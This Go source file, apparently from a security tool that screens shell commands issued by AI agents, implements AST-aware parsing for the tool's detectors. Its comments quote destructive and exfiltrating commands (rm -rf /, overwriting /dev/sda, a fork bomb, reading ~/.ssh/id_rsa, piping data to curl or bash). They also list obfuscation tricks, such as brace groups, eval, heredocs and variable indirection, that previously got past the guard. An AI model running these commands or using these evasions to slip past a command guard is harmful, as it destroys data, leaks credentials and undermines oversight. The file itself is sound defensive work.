// Package shellparse provides AST-aware shell command parsing using mvdan.cc/sh/v3.
// It extracts structured command representations (ParsedCommand) that can be
// consumed by both the normalizer (for path extraction) and the structural
// analyzer (for security checks).
//
// This package was extracted from the structural analyzer to allow the
// normalizer to use AST-aware parsing for context-sensitive path extraction,
// eliminating false positives from text content that mentions sensitive paths.
package shellparse

import (
	"path"
	"regexp"
	"sort"
	"strconv"
	"strings"

	"github.com/AI-AgentLens/agentshield/internal/pathnorm"
	"mvdan.cc/sh/v3/syntax"
)

// ParsedCommand is the structural representation of a shell command.
type ParsedCommand struct {
	// Segments are the pipeline-separated commands.
	// "curl ... | bash" → 2 segments.
	Segments []CommandSegment

	// Operators between segments: "|", "&&", "||", ";"
	Operators []string

	// Redirects at the top level (e.g., "> /dev/null")
	Redirects []Redirect

	// Subcommands found via indirect execution parsing (depth > 0).
	// E.g., for "bash -c 'rm -rf /'", the inner "rm -rf /" is a subcommand.
	Subcommands []*ParsedCommand
}

// CommandSegment is a single command within a pipeline.
type CommandSegment struct {
	Raw        string            // original text of this segment
	Executable string            // base command name (e.g., "rm", "curl")
	SubCommand string            // e.g., "install" for "npm install"
	Args       []string          // positional arguments
	Flags      map[string]string // normalized flags: key=flag name, value=flag value (or "")
	Redirects  []Redirect        // segment-level redirects
	IsShell    bool              // true if executable is a known shell interpreter
	// CFlagArg is the raw (still-quoted) word immediately following a short
	// flag cluster that contains 'c' (e.g. "-c", "-ec"). Captured positionally
	// while walking the raw word list, because bucketing everything into
	// Flags/Args loses position: a value-taking flag earlier in the command
	// ("-O expand_aliases", "--rcfile /tmp/x") shifts what lands in Args[0]
	// away from the actual -c payload (#3059). Empty when no c-bearing flag
	// was seen.
	CFlagArg string
	// HeredocBody is the literal body text of a `<<`/`<<-` heredoc attached to
	// this statement, captured only when IsShell — a shell interpreter fed a
	// heredoc runs the body exactly like `-c` code, just via stdin instead of
	// argv (#3081). Empty when there is no heredoc redirect on this statement.
	HeredocBody string
	// HereStringBody is the literal payload of a `<<<` here-string redirect
	// attached to this statement, captured only when IsShell — `bash <<<
	// 'rm -rf /'` and `bash -s <<< 'rm -rf /'` read their command from stdin
	// exactly like the heredoc above, just spelled with `<<<` instead of
	// `<<`/`<<-` (#3242). Any flag on the interpreter (`-s`, `-i`, `-x`,
	// `--norc`, `--`) is irrelevant to this: every one of them still reads
	// from stdin when no `-c` is present. Populated only when the redirect's
	// word is fully literal (no ParamExp/CmdSubst) — `bash <<< "$cmd"` has no
	// statically-resolvable payload. Empty when there is no here-string
	// redirect on this statement, or its payload isn't a literal.
	HereStringBody string
	// SourceArg is shell source this segment hands to a shell through a flag
	// VALUE or a trailing positional operand rather than behind an
	// interpreter's `-c` — `man -P 'CMD' page`, `flock -c 'CMD'`, `env -S
	// 'CMD'`, `watch -n1 'CMD'` (issue #3232). Captured from the argv position
	// for the same reason CFlagArg is: bucketing into Flags/Args loses which
	// token was the value of which flag. Empty when the executable is not a
	// shell-source carrier. See shellSourceFlags for the table and, more
	// importantly, for why a wrong entry here fails toward a FALSE POSITIVE
	// rather than a miss.
	SourceArg string
	// ProcSubstLiteral is the literal text an input process substitution
	// ("<(echo '...')" / "<(printf '...')") would write to its anonymous
	// fifo, captured either from this segment's ARGUMENTS (when Executable
	// is "source"/"." or a real shell interpreter — all three read that fd's
	// CONTENT and execute it as shell script, the same deferred-execution
	// shape as eval/trap/-c/heredoc, #3190) or from a STDIN REDIRECT target
	// on a shell interpreter (`bash < <(echo '...')`, `sh 0< <(echo '...')`
	// — the same execution shape as a heredoc/here-string, just spelled as a
	// redirect from a process substitution instead of a literal word,
	// #3242). Empty when neither shape is present, or the process
	// substitution's body isn't a literal-only echo/printf.
	ProcSubstLiteral string
	// RawWords is this segment's own argv (flags and positionals interleaved,
	// in original order, executable excluded) as individual shell WORDS —
	// each entry is exactly one AST word's printed text, quote characters
	// intact. Unlike Args/Flags, a single quoted word containing internal
	// whitespace ("'cat ~/.ssh/id_rsa'") stays ONE entry here. Callers that
	// need to re-walk argv positionally (e.g. normalize.astAwareExtract's
	// TextPositions handling) must use this instead of re-splitting Raw or a
	// caller-supplied token list on whitespace — a naive re-split breaks a
	// quoted multi-word argument into fragments, so a designated "text"
	// position only swallows the first fragment and the rest leaks into the
	// next positional slot as if it were a separate, real argument (#3224).
	RawWords []string
}

// Redirect represents a shell redirect operation.
type Redirect struct {
	Op   string // ">", ">>", "<", "2>"
	Path string // target path
}

// Parse converts a raw command string into a ParsedCommand AST.
// maxDepth controls recursion into indirect execution (e.g., bash -c '...').
func Parse(command string, maxDepth int) *ParsedCommand {
	if maxDepth <= 0 {
		maxDepth = 2
	}
	return parseWithDepth(command, 0, maxDepth)
}

func parseWithDepth(command string, depth, maxDepth int) *ParsedCommand {
	if depth >= maxDepth {
		return nil
	}

	// Canonicalize ${IFS}/$IFS word-splitting separators to literal spaces
	// before parsing, so every AST-based analyzer downstream sees the same
	// argument boundaries a real shell resolves at runtime (#3044).
	if normalized := NormalizeIFS(command); normalized != "" {
		command = normalized
	}

	// Fold parameter expansions of provably-unset variables to the text a
	// real shell produces for them, so `r${zqx}m -rf /` and `${zqx:-rm} -rf /`
	// present the executable name they actually run (#3044's sibling class —
	// see NormalizeUnsetParamExp). Runs after NormalizeIFS because IFS is a
	// well-known env var that NormalizeUnsetParamExp deliberately never folds,
	// so the two passes cannot contend for the same span.
	if normalized := NormalizeUnsetParamExp(command); normalized != "" {
		command = normalized
	}

	// Expand whole-word brace groups ("{rm,-rf,/}") into the space-joined word
	// list a real shell produces for them, so a brace-list executable/argument
	// obfuscation presents the AST it actually runs (issue #3217). Runs after
	// NormalizeUnsetParamExp so a param-expansion splice hiding INSIDE a group
	// item ("{r${zqx}m,-rf,/}") is folded to plain text first — a group whose
	// item still carries a ParamExp is not a complete literal run and is left
	// alone by NormalizeBraceWordList's fail-safe residue check.
	if normalized := NormalizeBraceWordList(command); normalized != "" {
		command = normalized
	}

	// Propagate constant `Name=value` assignments into every argument/
	// redirect-target/test-operand word that reads them via $NAME/${NAME}
	// (issue #3249). Runs last in this chain, after the other folds have
	// settled the text, so a materialized value composes with whatever
	// shape the assignment or its usage arrived in (IFS-joined, unset-splice-
	// folded, brace-expanded). Without this, every AST-based analyzer
	// (structural/semantic/dataflow/stateful) saw only the raw "$P1/$P2"
	// text — the split-concat path was invisible to all four, the same
	// "compound wraps it, four layers go blind" shape as #3045, just via
	// variable substitution instead of an unwalked node type.
	if normalized := MaterializeAssignments(command); normalized != "" {
		command = normalized
	}

	reader := strings.NewReader(command)
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(reader, "")
	if err != nil {
		return fallbackParse(command)
	}

	// Constant symbol table for indirect executable name resolution: scalar
	// bindings (#3089) "x=rm; $x -rf /" and "$(echo rm) -rf /", plus constant
	// array literals (#3091) "a=(rm -rf /); \"${a[@]}\"" — both run exactly
	// "rm -rf /", just naming the executable through one level of indirection.
	// Built once from the WHOLE file (over-approximating scope the same way
	// substitution.go's buildSymbolTable already does for path materialization)
	// so it covers both the top-level segments and any embedded command/process
	// substitution body below, which share the same variable bindings a real
	// subshell would inherit at fork time.
	syms := buildExecSymbols(file)

	pc := &ParsedCommand{}
	appendStmtSequence(pc, file.Stmts, command, depth, maxDepth, syms)

	// Command substitution ($(...), legacy `...`) and process substitution
	// (<(...), >(...)) each run their body as a real command, regardless of
	// where they're textually embedded — inside a plain CallExpr argument
	// ("echo $(rm -rf /)"), a DeclClause/LetClause/ArithmCmd/TestClause
	// ("declare x=$(rm -rf /)", "((y=$(rm -rf /)))", "[[ $(rm -rf /) ]]"),
	// a redirect target, a heredoc body, anywhere. Before this, none of
	// those bodies became a segment: only the OUTER command (echo, declare,
	// ...) was ever walked, so structural/semantic/dataflow/stateful — every
	// AST-based layer — saw nothing, downgrading a bare "rm -rf /" BLOCK to
	// ALLOW just by wrapping it in "echo $(...)". See #3045 for the same
	// bypass shape (compound commands contributing zero segments); this is
	// its command-substitution equivalent (issue #3076).
	//
	// findEmbeddedCommands uses syntax.Walk rather than a hand-rolled type
	// switch deliberately: Walk's own switch panics on an unhandled node
	// type, so it cannot silently miss an embedding context the way the
	// per-node-type switches in walkStmt/collectStmts could (and did, per
	// #3045) — it already visits every CmdSubst/ProcSubst in the tree, at
	// any nesting depth, with no enumeration to keep in sync.
	for _, stmts := range findEmbeddedCommands(file) {
		sub := &ParsedCommand{}
		appendStmtSequence(sub, stmts, command, depth, maxDepth, syms)
		if len(sub.Segments) > 0 || len(sub.Subcommands) > 0 {
			pc.Subcommands = append(pc.Subcommands, sub)
		}
	}

	return pc
}

// findEmbeddedCommands returns the statement list of every command
// substitution and process substitution found anywhere in node's subtree.
func findEmbeddedCommands(node syntax.Node) [][]*syntax.Stmt {
	var out [][]*syntax.Stmt
	syntax.Walk(node, func(n syntax.Node) bool {
		switch v := n.(type) {
		case *syntax.CmdSubst:
			if len(v.Stmts) > 0 {
				out = append(out, v.Stmts)
			}
		case *syntax.ProcSubst:
			if len(v.Stmts) > 0 {
				out = append(out, v.Stmts)
			}
		}
		return true
	})
	return out
}

// appendStmtSequence walks a list of statements that are implicitly
// sequenced — top-level "file.Stmts" (separated by ";" or a bare newline)
// and subshell "( ... )" bodies both take this shape. mvdan.cc/sh represents
// each statement in the list as its own entry with NO BinaryCmd node, unlike
// "&&"/"||"/"|" which nest inside a single Stmt. Without recording ";"
// between them here, Operators stays shorter than Segments-1 for any such
// command, and stateful chain rules with an explicit operator constraint
// (e.g. "|") would either skip the check via an out-of-bounds guard —
// matching regardless of what actually connects the segments — or, once that
// guard fails closed, wrongly refuse to match a ";" that was never recorded.
// See #2889.
func appendStmtSequence(pc *ParsedCommand, stmts []*syntax.Stmt, raw string, depth, maxDepth int, syms *ExecSymbols) {
	for _, stmt := range stmts {
		segBefore := len(pc.Segments)
		stmtPC := &ParsedCommand{}
		walkStmt(stmtPC, stmt, raw, depth, maxDepth, syms)
		if segBefore > 0 && len(stmtPC.Segments) > 0 {
			pc.Operators = append(pc.Operators, ";")
		}
		pc.Segments = append(pc.Segments, stmtPC.Segments...)
		pc.Operators = append(pc.Operators, stmtPC.Operators...)
		pc.Redirects = append(pc.Redirects, stmtPC.Redirects...)
		pc.Subcommands = append(pc.Subcommands, stmtPC.Subcommands...)
	}
}

func walkStmt(pc *ParsedCommand, stmt *syntax.Stmt, raw string, depth, maxDepth int, syms *ExecSymbols) {
	if stmt.Cmd == nil {
		return
	}

	stmtRedirects := make([]Redirect, 0, len(stmt.Redirs))
	for _, redir := range stmt.Redirs {
		r := Redirect{Op: redirectOpString(redir)}
		if redir.Word != nil {
			r.Path = WordToString(redir.Word)
		}
		stmtRedirects = append(stmtRedirects, r)
	}

	// A redirect on a compound construct's own Stmt ("{ ...; } > file") wraps
	// the group's combined output and is not owned by any single inner
	// segment, so it stays at the top level as before. A redirect on a plain
	// CallExpr statement DOES belong to exactly one segment — handled below,
	// where it is attached directly instead of bubbling up (see the
	// CallExpr case for why bubbling caused #3047's misattribution).
	if _, isCall := stmt.Cmd.(*syntax.CallExpr); !isCall {
		pc.Redirects = append(pc.Redirects, stmtRedirects...)
	}

	switch cmd := stmt.Cmd.(type) {
	case *syntax.CallExpr:
		seg := callExprToSegment(cmd, raw, syms)
		// Own this statement's redirects on the segment itself (#3047). A
		// prior version bubbled every stmt.Redirs into the shared top-level
		// pc.Redirects regardless of node type, and dataflow.checkRedirectFlows
		// paired every top-level redirect with Segments[0] unconditionally.
		// That is correct only when the redirect-bearing statement happens to
		// BE the first segment — true for a bare "cat /dev/zero > /dev/sda",
		// false the moment a compound construct puts another statement first
		// ("if true; then cat /dev/zero > /dev/sda; fi" pairs the redirect
		// with the "true" condition's segment instead). Attaching redirects to
		// the segment that actually owns them removes the ambiguity entirely.
		seg.Redirects = stmtRedirects
		// A heredoc fed to a shell interpreter runs its body exactly like `-c`
		// code (#3081) — "bash <<EOF\nrm -rf /\nEOF" is exactly as destructive
		// as "bash -c 'rm -rf /'", just carried via stdin instead of argv. Only
		// the FIRST heredoc redirect is taken deliberately: a statement with
		// multiple heredocs on different fds is vanishingly rare, and taking
		// the first is a conservative under-approximation (still analyzed,
		// just not perfectly), never a silent skip.
		if seg.IsShell {
			for _, redir := range stmt.Redirs {
				if redir.Hdoc != nil {
					// TrimSpace: the printer includes the trailing newline
					// before the delimiter line, which would defeat a
					// "$"-anchored rule, and a "<<-" body's leading tabs
					// (stripped by a real shell, kept by the printer) would
					// defeat a "^"-anchored one. Internal line indentation is
					// untouched — only the outer edges are trimmed.
					seg.HeredocBody = strings.TrimSpace(WordToString(redir.Hdoc))
					break
				}
			}
			// A here-string (`<<<`) or a stdin redirect from a literal-only
			// process substitution (`< <(...)`, `0< <(...)`) hands a shell
			// interpreter its SOURCE via stdin exactly like the heredoc
			// above — two more spellings of the same delivery mechanism
			// that #3242 closes: neither produced a segment before this,
			// and only ts-block-herestring-shell-exec's single hardcoded
			// invocation shape (interpreter immediately followed by `<<<`,
			// defeated by ANY flag including `-s`) stood in for real
			// decomposition. Checked only when no heredoc body was already
			// found on this statement, mirroring the heredoc loop's own
			// "first redirect wins" conservatism.
			if seg.HeredocBody == "" {
				for _, redir := range stmt.Redirs {
					switch {
					case redir.Op == syntax.WordHdoc:
						if val, ok := literalWordValue(redir.Word); ok {
							seg.HereStringBody = val
						}
					case redir.Op == syntax.RdrIn && isStdinFD(redir.N) && seg.ProcSubstLiteral == "":
						if lit, ok := wordProcSubstLiteral(redir.Word); ok {
							seg.ProcSubstLiteral = lit
						}
					}
					if seg.HereStringBody != "" || seg.ProcSubstLiteral != "" {
						break
					}
				}
			}
		}
		// Check for indirect execution (bash -c, python -c, eval, etc.). eval
		// and trap are builtins, not shell interpreters, so neither ever sets
		// seg.IsShell — checked separately here (#3059, #3084). "source"/"."
		// are builtins too — checked via ProcSubstLiteral instead of
		// Executable, since only some invocations of them (a literal-only
		// echo/printf process substitution) carry extractable code (#3190).
		// PrivilegeShellCarriers (su, runuser) belong here for the same reason
		// eval and trap do, and this is the surface that matters most: teaching
		// ExtractInlineCode about `su -c` alone only reached the regex layer's
		// candidate list and left the payload undecomposed, so structural and
		// semantic rules still saw one opaque argument. Measured, that partial
		// fix was 12.6% against a 2.4% `bash -c` control; adding the sub-parse
		// closed the rest. #3208's lesson, recurring: fix every surface or the
		// number reads like a fix that did not work (#3223).
		if CarriesShellSource(seg) {
			inner := ExtractInlineCode(seg)
			if inner != "" {
				sub := parseWithDepth(inner, depth+1, maxDepth)
				if sub != nil {
					pc.Subcommands = append(pc.Subcommands, sub)
				}
			}
		}
		pc.Segments = append(pc.Segments, seg)

	case *syntax.BinaryCmd:
		op := binaryOpString(cmd.Op)
		leftPC := &ParsedCommand{}
		rightPC := &ParsedCommand{}
		walkStmt(leftPC, cmd.X, raw, depth, maxDepth, syms)
		walkStmt(rightPC, cmd.Y, raw, depth, maxDepth, syms)
		// N-way chains (e.g. "cat x | base64 | curl") nest left-associatively,
		// so leftPC/rightPC can carry their own internal Operators (from a
		// nested BinaryCmd) that must be preserved in position, not just the
		// operator joining the two halves — otherwise a 3+ segment pipe loses
		// its inner operator and stateful chain rules can't verify it (#2889).
		pc.Segments = append(pc.Segments, leftPC.Segments...)
		pc.Operators = append(pc.Operators, leftPC.Operators...)
		pc.Operators = append(pc.Operators, op)
		pc.Segments = append(pc.Segments, rightPC.Segments...)
		pc.Operators = append(pc.Operators, rightPC.Operators...)
		pc.Subcommands = append(pc.Subcommands, leftPC.Subcommands...)
		pc.Subcommands = append(pc.Subcommands, rightPC.Subcommands...)

	case *syntax.Subshell:
		appendStmtSequence(pc, cmd.Stmts, raw, depth, maxDepth, syms)

	case *syntax.TimeClause:
		// "time rm -rf /" — bash parses `time` as a reserved word wrapping a
		// statement, not a CallExpr. See through it to the wrapped command so it
		// is analyzed normally instead of vanishing into an empty parse.
		if cmd.Stmt != nil {
			walkStmt(pc, cmd.Stmt, raw, depth, maxDepth, syms)
		}

	// --- Compound commands (issue #3045) -----------------------------------
	// Every node type below wraps ordinary statements in a bash keyword. Before
	// they were handled here, they hit the end of this switch and contributed
	// ZERO segments, so "{ rm --recursive --force /; }" parsed to an empty
	// ParsedCommand. ctx.Parsed stays non-nil, so the "parsed == nil" guards in
	// the structural, semantic, dataflow, and stateful analyzers do not fire —
	// each one simply iterates an empty segment list and reports nothing. The
	// result was a universal enforcement bypass: wrapping any command in braces
	// silently downgraded it from BLOCK to AUDIT by defeating 4 of the 7
	// decision layers, leaving only regex and guardian. See #3045 for the
	// before/after decision matrix.
	case *syntax.Block:
		// "{ rm -rf /; }" — brace group, runs in the CURRENT shell.
		appendStmtSequence(pc, cmd.Stmts, raw, depth, maxDepth, syms)

	case *syntax.IfClause:
		// "if <cond>; then <body>; else <body>; fi" — the condition is executed
		// too ("if rm -rf /; then ..."), so walk it as well as the branches.
		// Else/elif chains hang off .Else as further IfClause nodes.
		appendStmtSequence(pc, cmd.Cond, raw, depth, maxDepth, syms)
		appendStmtSequence(pc, cmd.Then, raw, depth, maxDepth, syms)
		if cmd.Else != nil {
			walkCommand(pc, cmd.Else, raw, depth, maxDepth, syms)
		}

	case *syntax.WhileClause:
		// Covers both "while" and "until" (distinguished only by cmd.Until).
		// This is what left the "while true; do bash & done" fork bomb in
		// FAILING_TESTS.md — it was never a missing rule, just an unwalked node.
		appendStmtSequence(pc, cmd.Cond, raw, depth, maxDepth, syms)
		appendStmtSequence(pc, cmd.Do, raw, depth, maxDepth, syms)

	case *syntax.ForClause:
		// "for f in *; do rm -rf "$f"; done" — the loop body is the payload.
		appendStmtSequence(pc, cmd.Do, raw, depth, maxDepth, syms)

	case *syntax.CaseClause:
		// "case $x in *) rm -rf /;; esac" — every branch is reachable.
		for _, item := range cmd.Items {
			if item != nil {
				appendStmtSequence(pc, item.Stmts, raw, depth, maxDepth, syms)
			}
		}

	case *syntax.FuncDecl:
		// "f() { rm -rf /; }; f" — declaring the function does not run it, but
		// the dangerous code is already present in the command text (the regex
		// layer matches it there today), and the agent idiom is to define and
		// immediately call. Walking the body keeps structural analysis
		// consistent with what regex already sees rather than adding a new
		// detection surface.
		//
		// withoutPositionals: a function call rebinds $1..$N/$@/$* to its own
		// arguments, so an outer `set --` binding must not leak into the body
		// (#3237) — scalars/arrays pass through unchanged since they aren't
		// function-scoped.
		if cmd.Body != nil {
			walkStmt(pc, cmd.Body, raw, depth, maxDepth, withoutPositionals(syms))
		}

	case *syntax.CoprocClause:
		// "coproc rm -rf /" — backgrounds the statement in a co-process.
		if cmd.Stmt != nil {
			walkStmt(pc, cmd.Stmt, raw, depth, maxDepth, syms)
		}
	}
}

// walkCommand walks a bare syntax.Command that is not wrapped in a Stmt.
// Only elif/else chains need this: syntax.IfClause.Else is an *IfClause
// directly rather than a *Stmt, so it cannot go through walkStmt.
func walkCommand(pc *ParsedCommand, cmd syntax.Command, raw string, depth, maxDepth int, syms *ExecSymbols) {
	walkStmt(pc, &syntax.Stmt{Cmd: cmd}, raw, depth, maxDepth, syms)
}

func callExprToSegment(call *syntax.CallExpr, raw string, syms *ExecSymbols) CommandSegment {
	seg := CommandSegment{
		Flags: make(map[string]string),
	}

	words := make([]string, 0, len(call.Args))
	for _, word := range call.Args {
		words = append(words, WordToString(word))
	}

	if len(words) == 0 {
		return seg
	}

	// Resolve a statically-known indirect executable name: "x=rm; $x -rf /"
	// and "$(echo rm) -rf /" (#3089), or an array expansion "a=(rm -rf /);
	// ${a[0]}" / "${a[@]}" (#3091) — all run exactly "rm -rf /", just naming
	// the executable (and, for the array-splat / multi-word echo forms, its
	// args) through one level of indirection. Only the EXECUTABLE position is
	// resolved; the split words replace that single indirection token so every
	// downstream step (wrapper-stripping, flag parsing, subcommand detection,
	// ExtractInlineCode) runs on the real argv exactly as if it had been
	// written directly. A resolution that expands to a SINGLE word (the common
	// "$x" case) splices one element and behaves identically to before;
	// unresolved cases (unknown var, dynamic value) fall through unchanged.
	// Additive, never weakening.
	if resolved, ok := resolveExecWord(call.Args[0], syms); ok {
		if rw := strings.Fields(resolved); len(rw) > 0 {
			words = append(rw, words[1:]...)
		}
	}

	// Transparently see through execution wrappers (sudo, env, nohup, nice,
	// timeout, ...) so structural rules match the REAL executable. Without this,
	// "nice rm -rf /" or "env rm -rf /" would parse with Executable=="nice"/"env"
	// and dodge every structural rule keyed on the "rm" executable.
	words = StripExecWrappers(words)
	seg.Executable = NormalizeExecName(words[0])
	remaining := words[1:]
	seg.RawWords = remaining

	// Capture a shell-source flag value / trailing operand (#3232). Runs on the
	// POST-strip words on purpose, so a wrapper prefix composes — `sudo man -P
	// 'CMD' page` is stripped to `man -P 'CMD' page` and still resolves. env's
	// own `-S` survives the strip because `-S` is in wrapperValueFlags, so the
	// operand walk skips it and leaves `env` in executable position rather than
	// naming the payload string as the command.
	seg.SourceArg = ShellSourceArg(words)

	// Scan the RAW argv (not the stringified `words`, which already lost the
	// ProcSubst node) for a literal-only "<(echo ...)" / "<(printf ...)"
	// process substitution — see ProcSubstLiteral's doc comment (#3190). Scans
	// every arg regardless of position (not just call.Args[1:]) so an
	// execution wrapper ahead of the real executable ("sudo source <(...)")
	// still finds it despite the words/call.Args index offset that
	// StripExecWrappers introduces between the two representations.
	if isProcSubstSourceExec(seg.Executable) {
		for _, w := range call.Args {
			if lit, ok := wordProcSubstLiteral(w); ok {
				seg.ProcSubstLiteral = lit
				break
			}
		}
	}

	// eval has no options — every argument is literal shell source, joined
	// with a space and re-parsed (bash `help eval`). Running it through the
	// flag-cluster loop below would silently drop a leading "-"-prefixed
	// argument into seg.Flags instead of seg.Args, corrupting the
	// reconstructed code the moment ExtractInlineCode rejoins it: "eval rm
	// -rf /" would lose "-rf" and reconstruct as "rm /" (#3059). Keep the
	// raw words as-is so evalCode can rebuild the exact source eval receives.
	if seg.Executable == "eval" {
		seg.Args = remaining
		seg.Raw = strings.Join(words, " ")
		return seg
	}

	seg.IsShell = IsShellInterpreter(seg.Executable)
	for i := 0; i < len(remaining); i++ {
		w := remaining[i]
		// Fold an obfuscating backslash BEFORE the "--" vs "-" classification
		// below, not only after it (issue #3209). "-\-hard" has no unescaped
		// "--" prefix, so without this it falls into the short-flag branch and
		// is shredded into bogus single-character flags ('-','h','a','r','d')
		// instead of being recognized as the long flag "hard" — no text fix
		// downstream of that branch decision can recover it.
		//
		// Gated on w carrying NO quote character at all: w here is already the
		// printed TEXT of the word (WordToString), not the AST, so unlike
		// dequoteWordInPlace's fold this one cannot tell whether a backslash
		// sits inside single quotes (where bash leaves it untouched, e.g. a
		// sed pattern "'s/a\/b/c/'") or outside them. Restricting to
		// quote-free words is exactly the shape #3209 targets (a bare,
		// unquoted flag/path token) and never touches quoted content that a
		// blind fold could corrupt.
		if !strings.ContainsAny(w, `'"`) {
			if folded, changed := pathnorm.FoldObfuscatingBackslashes(w); changed {
				w = folded
			}
		}
		if strings.HasPrefix(w, "--") && len(w) > 2 {
			// Strip quote-splice noise before using the flag name as a map key
			// ("--trusted-ho'st'" must key as "trusted-host", the same value
			// the shell resolves it to) — same class of fix as NormalizeExecName
			// and matchArgGlob (issue #2813/#3003).
			flag := pathnorm.StripShellQuotes(w[2:])
			if eqIdx := strings.Index(flag, "="); eqIdx >= 0 {
				seg.Flags[flag[:eqIdx]] = flag[eqIdx+1:]
			} else {
				seg.Flags[flag] = ""
			}
		} else if strings.HasPrefix(w, "-") && len(w) > 1 && !strings.HasPrefix(w, "--") {
			stripped := pathnorm.StripShellQuotes(w[1:])
			for _, ch := range stripped {
				seg.Flags[string(ch)] = ""
			}
			// The -c/-ec/... payload is POSITIONAL — the very next token,
			// regardless of what other flags preceded this one. Capture it
			// here, while the position is still known, instead of relying on
			// Args[0] (see CFlagArg doc comment / #3059).
			if seg.CFlagArg == "" && strings.ContainsRune(stripped, 'c') && i+1 < len(remaining) {
				seg.CFlagArg = remaining[i+1]
			}
		} else {
			seg.Args = append(seg.Args, w)
		}
	}

	// Detect subcommand for known tools
	if len(seg.Args) > 0 {
		if IsSubcommandTool(seg.Executable) {
			// The subcommand verb is half the command's identity for these
			// tools (terraform destroy, kubectl delete) — normalize it the
			// same way the executable itself is normalized just above.
			// Previously left raw, so "terraform d\estroy -auto-approve"
			// evaded structural rules the executable-position equivalent
			// already caught (issue #3208).
			seg.SubCommand = NormalizeExecName(seg.Args[0])
			seg.Args = seg.Args[1:]
		}
	}

	seg.Raw = strings.Join(words, " ")
	return seg
}

// BuildExecSymbolTable parses command and returns the constant symbol table
// used to resolve indirect executable names — scalar bindings (#3089) and
// constant array literals (#3091). Exported so the regex analyzer can compute
// it once per command (from the FULL raw text, where the defining assignment
// lives) and reuse it across every per-statement candidate via
// ResolveIndirectExecutable, mirroring how the AST layer's own Parse resolves
// executables through this same table. Returns nil (not an error) when the
// command doesn't parse or has no resolvable assignments — callers treat that
// as "nothing to resolve".
func BuildExecSymbolTable(command string) *ExecSymbols {
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(command), "")
	if err != nil {
		return nil
	}
	syms := buildExecSymbols(file)
	if containsFuncDecl(file) {
		// This table is reused flat against per-statement candidate text
		// (ResolveIndirectExecutable, called once per regex-retry candidate
		// with no AST scope context) — unlike the primary walkStmt path, it
		// cannot tell a $1 usage inside a function body from one outside it.
		// See containsFuncDecl's doc comment (#3237).
		syms = withoutPositionals(syms)
	}
	return syms
}

// ResolveIndirectExecutable rewrites stmt's executable word in place when it
// is a $VAR/$(echo X)/${a[@]} indirection resolvable via syms (see
// BuildExecSymbolTable), and returns "" when there is nothing to resolve —
// the same "empty means no-op" convention as StripCommandPrefixes and
// StripExecWrapperPrefix. Only the head of a pipeline is resolved (mirrors
// leftmostCallExpr's use elsewhere): "$x -s url | bash" resolves to "curl -s
// url | bash" when x=curl, leaving the pipe sink untouched.
//
// This is the regex layer's half of #3089: shellparse.Parse already resolves
// the AST-based segment's Executable field, but the regex analyzer matches
// raw text, which still reads "$x -rf /" — same "text layer disagrees with
// AST layer" shape as StripExecWrapperPrefix (#3057) and InlineCodeFragments
// (#3050).
func ResolveIndirectExecutable(stmt string, syms *ExecSymbols) string {
	// No early-return on an empty syms table: the CmdSubst ($(echo X)) form
	// resolveExecWord also handles needs no symbol table at all, only the
	// $VAR/${VAR} form does. Bailing here would silently skip every
	// "$(echo dd) ..." candidate on a command with zero assignments.
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(stmt), "")
	if err != nil || len(file.Stmts) != 1 {
		return ""
	}
	call := leftmostCallExpr(file.Stmts[0])
	if call == nil || len(call.Args) == 0 {
		return ""
	}
	resolved, ok := resolveExecWord(call.Args[0], syms)
	if !ok {
		return ""
	}
	start := int(call.Args[0].Pos().Offset())
	end := int(call.Args[0].End().Offset())
	if start < 0 || end > len(stmt) || start > end {
		return ""
	}
	return stmt[:start] + resolved + stmt[end:]
}

// ResolveIndirectExecutables rewrites EVERY leaf statement's executable word
// that resolves via the whole command's constant-scalar symbol table, and
// returns the fully-rewritten command — or "" if nothing resolved.
//
// This is the whole-command counterpart to ResolveIndirectExecutable, needed
// for a different reason than the per-statement retry candidates: an
// UNANCHORED regex rule (no "^"/"$", see isPositionSensitive's doc comment in
// regex.go) skips the per-statement retry entirely, on the theory that if a
// candidate is a substring of the original command the whole-command check
// already matched it — true for quote-stripping and IFS-normalization, which
// only reveal an already-present substring. It is NOT true for indirect
// executable resolution: "aws" is not a literal substring of "x=aws; $x ec2
// terminate-instances ...", so an unanchored "aws\s+ec2\s+terminate" rule
// needs the resolved text to exist somewhere in a WHOLE-command candidate to
// match at all (#3089).
//
// Pipelines are kept whole (mirrors SplitSequencedStatements, not
// SplitTopLevelStatements) — only the head of a pipe is a real command word
// to resolve; the sink is dataflow's concern, not this resolver's.
func ResolveIndirectExecutables(command string) string {
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	file, err := parser.Parse(strings.NewReader(command), "")
	if err != nil {
		return ""
	}
	syms := buildExecSymbols(file)
	if containsFuncDecl(file) {
		// Same conservative bail as BuildExecSymbolTable, for the same
		// reason: collectStmts flattens leaf statements without recording
		// FuncDecl-body membership, so a leaf's syms cannot be scoped
		// per-function here the way walkStmt's recursive syms can (#3237).
		syms = withoutPositionals(syms)
	}

	var leaves []*syntax.Stmt
	for _, stmt := range file.Stmts {
		collectStmts(stmt, &leaves, false)
	}

	type splice struct {
		start, end int
		text       string
	}
	var splices []splice
	for _, stmt := range leaves {
		call := leftmostCallExpr(stmt)
		if call == nil || len(call.Args) == 0 {
			continue
		}
		resolved, ok := resolveExecWord(call.Args[0], syms)
		if !ok {
			continue
		}
		start := int(call.Args[0].Pos().Offset())
		end := int(call.Args[0].End().Offset())
		if start < 0 || end > len(command) || start >= end {
			continue
		}
		splices = append(splices, splice{start, end, resolved})
	}
	if len(splices) == 0 {
		return ""
	}

	sort.Slice(splices, func(i, j int) bool { return splices[i].start < splices[j].start })
	var sb strings.Builder
	pos := 0
	for _, sp := range splices {
		if sp.start < pos {
			// Overlapping splice — shouldn't happen for distinct leaf
			// statements' own Args[0] spans, but skip defensively rather
			// than corrupt the rebuilt string.
			continue
		}
		sb.WriteString(command[pos:sp.start])
		sb.WriteString(sp.text)
		pos = sp.end
	}
	sb.WriteString(command[pos:])
	return sb.String()
}

// ExecSymbols is the constant symbol table used to resolve indirect executable
// names at parse time. It carries two kinds of statically-known binding:
//
//	scalars: NAME=rm          resolves  $NAME / ${NAME}            (#3089)
//	arrays:  NAME=(rm -rf /)  resolves  ${NAME[@]}/[*]/[<n>]       (#3091)
//
